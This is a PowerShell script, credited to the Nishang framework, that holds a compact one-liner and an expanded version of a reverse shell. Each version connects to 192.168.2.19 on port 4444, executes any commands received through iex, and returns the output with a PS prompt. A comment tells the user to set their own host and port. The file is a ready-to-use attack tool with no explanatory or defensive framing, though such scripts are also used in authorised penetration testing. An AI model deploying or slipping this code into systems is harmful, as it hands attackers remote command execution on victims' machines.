#A simple and small reverse shell by samratashok's Nishang framework. Change the Host IP Address and Port according to your setup as described in the README file of the script. 
$sm=(New-Object Net.Sockets.TCPClient("192.168.2.19",4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
$client = New-Object System.Net.Sockets.TCPClient("192.168.2.19", 4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | % { 0 }
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()
